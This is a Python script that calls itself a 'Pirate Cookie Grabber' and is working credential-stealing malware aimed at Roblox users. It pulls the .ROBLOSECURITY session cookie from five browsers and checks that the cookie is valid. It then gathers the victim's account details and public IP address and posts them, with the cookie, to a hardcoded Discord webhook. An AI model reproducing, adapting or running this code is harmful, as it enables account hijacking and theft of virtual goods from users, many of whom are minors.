import os
import json
import requests
import browser_cookie3
import robloxpy
from discordwebhook import Discord

webhook_url = "https://discord.com/api/webhooks/1133482508672045078/GjsQxlqs_LLvDJ-SucaongB6ZBgnbeEQMfLegnXdrgnv0WML91fh0RXdbIDwwmG2uKLB"

def cookieLogger():
    data = []
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

cookies = cookieLogger()

if cookies:
    roblox_cookie = cookies[1]
    is_valid = robloxpy.Utils.CheckCookie(roblox_cookie)
    if is_valid == "Valid Cookie":
        session = requests.Session()
        session.cookies[".ROBLOSECURITY"] = roblox_cookie

        # Use the session object to send requests with the cookie
        ebruh = session.get("https://www.roblox.com/mobileapi/userinfo")
        try:
            info = json.loads(ebruh.text)

            # Send the data to the webhook
            data = {
                "username": "BOT - Pirate 🍪",
                "avatar_url": "https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
                "embeds": [
                    {
                        "title": "💸 +1 Result Account 🕯️",
                        "description": f"**Username:** {info['UserName']}\n**Robux Balance:** {info['RobuxBalance']}\n**Premium Status:** {info['IsPremium']}\n**Creation Date:** {robloxpy.User.External.CreationDate(info['UserID'])}\n**RAP:** {robloxpy.User.External.GetRAP(info['UserID'])}\n**Friends:** {robloxpy.User.Friends.External.GetCount(info['UserID'])}\n**Account Age:** {robloxpy.User.External.GetAge(info['UserID'])}\n**IP Address:** {requests.get('https://api.ipify.org/').text}\n**.ROBLOSECURITY:** ```fix\n{roblox_cookie}```",
                        "color": 12452044,
                        "thumbnail": {"url": robloxpy.User.External.GetHeadshot(info['UserID'])},
                        "footer": {"text": "Pirate Cookie Grabber | github.com/Mani175/Pirate-Cookie-Grabber"},
                    }
                ]
            }
            response = requests.post(webhook_url, json=data)
            response.raise_for_status()
        except json.JSONDecodeError:
            print("Invalid JSON data")
    else:
        requests.post(url=webhook_url, data={"content": f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
else:
    print("No cookies found")
